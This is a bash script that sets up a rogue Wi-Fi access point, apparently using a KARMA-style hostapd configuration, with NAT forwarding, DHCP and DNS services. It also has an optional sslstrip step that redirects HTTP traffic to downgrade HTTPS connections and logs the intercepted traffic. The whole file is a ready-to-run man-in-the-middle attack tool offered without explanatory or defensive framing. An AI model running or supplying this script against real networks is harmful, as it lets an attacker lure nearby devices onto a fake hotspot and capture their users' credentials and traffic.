#!/bin/bash
help="$0 <ap-interface> <NIC-to-internet>"

if [ -z $1 ]; then
    echo $help
    exit
fi

ap=$1
internet=$2

## Options
bridge=1
dhcp=1
bind=1
hostapd=1
sslstrip=0

echo "" > /var/log/hostapd.log
## Initial wifi interface configuration
ifconfig $ap down
killall dhcpd
killall hostapd
service bind9 stop
sleep 2

ifconfig $ap up 10.0.0.1 netmask 255.255.255.0
sleep 2

## Bridge/NAT
if [ $bridge == 1 ]; then
    sysctl -w net.ipv4.ip_forward=1
    #iptables --flush
    #iptables --table nat --flush
    #iptables --delete-chain
    #iptables --table nat --delete-chain
    iptables --table nat --append POSTROUTING --out-interface $internet -j MASQUERADE
    iptables --append FORWARD --in-interface $ap -j ACCEPT
    iptables --append FORWARD --in-interface $internet -j ACCEPT
fi
   
## Hostapd
if [ $hostapd == 1 ]; then
    hostapd -dd /etc/hostapd/karma.conf&
    sleep 5
fi

## Sslstrip
if [ $sslstrip == 1 ]; then
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 4242
    sslstrip -l 4242 -a -w /var/log/sslstrip.log
fi

## DHCP
if [ $dhcp == 1 ]; then
    if [ "$(ps -e | grep dhcpd)" == "" ]; then
        dhcpd $ap &
    fi
fi

## Bind
if [ $bind == 1 ]; then
    service bind9 start
fi


